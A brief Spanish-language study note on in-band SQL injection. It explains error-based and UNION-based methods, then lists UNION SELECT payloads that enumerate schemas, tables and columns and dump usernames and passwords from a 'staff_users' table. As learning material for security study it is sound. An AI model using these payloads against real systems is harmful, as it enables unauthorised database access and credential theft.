In-Band SQLi


SQLi En Banda

La inyeccion SQL es el tipo mas facil de detectar y explotar, en banda simplemente se refiere al mismo metodo de comunicacion que se utiliza para explotar la vulnerabilidad y tambien recibir los resultados

por ejemplo descubrir una vulnerabilidad de inyeccion SQL en una pagina web y luego poder extraer datos de la base de datos a la misma pagina

SQL Injection Basada en Errores

Este tipo de inyeccion SQL es el mas util para obtener facilmente informacion sobre la estructura de la base de datos, ya que los mensajes de error se imprimen directamente en la pantalla del navegador, a menudo, se puede usar para

enumerar una base de datos completa.

SQL Injection Basada en UNION

Este tipo de inyeccion utiliza el operador SQL UNION junto con una instruccion SELECT para devolver resultados adicionales a la pagina, este metodo es la forma mas comun de extraer grandes cantidades de datos mediante una

vulnerabilidad de SQLi

-----------------------------------------------------

UNION SELECT schema_name from information_schema.schemata-- -

0 UNION SELECT 1,2,database();

0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database'

0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'table'

UNION SELECT table_name FROM information_schema.tables WHERE table_schema= ‘tablename’-- -

UNION SELECT column_name FROM information_schema.columns WHERE table_schema= ‘tablename’ and table_name='column'-- -

0 UNION SELECT 1,2,group_concat(username, password) FROM staff_users

0 UNION SELECT 1,2,group_concat(username,':', password SEPARATOR ‘<br>’) FROM staff_users

UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name = 'table'
